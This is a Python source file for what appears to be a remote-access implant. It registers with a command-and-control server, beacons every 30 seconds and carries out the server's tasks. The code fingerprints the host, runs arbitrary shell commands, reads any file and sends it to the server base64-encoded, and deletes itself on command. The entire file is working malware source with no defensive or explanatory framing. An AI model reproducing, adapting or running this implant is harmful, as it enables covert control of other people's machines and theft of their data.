import asyncio, json, os, platform, hashlib, time, uuid, base64, sys
from crypto import decrypt, generate_keypair
import httpx

C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
INTERVAL = 30

async def get_hwid() -> str:
    data = ""
    for path in ["/etc/machine-id", "/etc/hostname"]:
        try:
            data += open(path).read().strip()
        except:
            pass
    data += hex(uuid.getnode())
    return hashlib.sha256(data.encode()).hexdigest()[:16]

async def register() -> tuple[str, bytes]:
    hwid = await get_hwid()
    pk, sk = generate_keypair()
    async with httpx.AsyncClient() as client:
        resp = await client.post(f"{C2_URL}/v1/agent/register", json={
            "hwid": hwid,
            "pubkey": base64.b64encode(pk).decode(),
        })
        if resp.status_code == 201:
            data = resp.json()
            session_key = decrypt(sk, data["session_key"])
            return data["agent_id"], session_key
    raise RuntimeError("Registration failed")

async def heartbeat(agent_id: str, session_key: bytes) -> list[dict]:
    payload = base64.b64encode(json.dumps({"agent_id": agent_id, "status": "idle", "ts": time.time()}).encode()).decode()
    async with httpx.AsyncClient() as client:
        resp = await client.post(f"{C2_URL}/v1/agent/beat", json={"data": payload})
        if resp.status_code == 200:
            data = resp.json()
            return data.get("tasks", [])
        return []

async def execute_task(task: dict) -> dict:
    ttype = task.get("type", "exec")
    payload = task.get("payload", {})
    if ttype == "exec":
        import subprocess
        try:
            r = subprocess.run(payload.get("command", "whoami"), shell=True, capture_output=True, text=True, timeout=payload.get("timeout", 30))
            return {"stdout": r.stdout, "stderr": r.stderr, "code": r.returncode}
        except subprocess.TimeoutExpired:
            return {"error": "timeout"}
        except Exception as e:
            return {"error": str(e)}
    elif ttype == "upload":
        path = payload.get("path", "")
        try:
            with open(path, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            return {"path": path, "data": data}
        except Exception as e:
            return {"error": str(e)}
    elif ttype == "sleep":
        await asyncio.sleep(payload.get("duration", 3600))
        return {"slept": True}
    elif ttype == "uninstall":
        import shutil
        try:
            shutil.rmtree(os.path.dirname(os.path.abspath(__file__)), ignore_errors=True)
        except:
            pass
        os._exit(0)
    return {"error": f"unknown task type: {ttype}"}

async def submit_result(agent_id: str, session_key: bytes, task_id: str, result: dict):
    async with httpx.AsyncClient() as client:
        await client.post(f"{C2_URL}/v1/agent/result", json={
            "agent_id": agent_id, "task_id": task_id, "result": result,
        })

async def main():
    agent_id, session_key = await register()
    while True:
        tasks = await heartbeat(agent_id, session_key)
        for task in tasks:
            result = await execute_task(task)
            await submit_result(agent_id, session_key, task["id"], result)
        await asyncio.sleep(INTERVAL)

if __name__ == "__main__":
    asyncio.run(main())
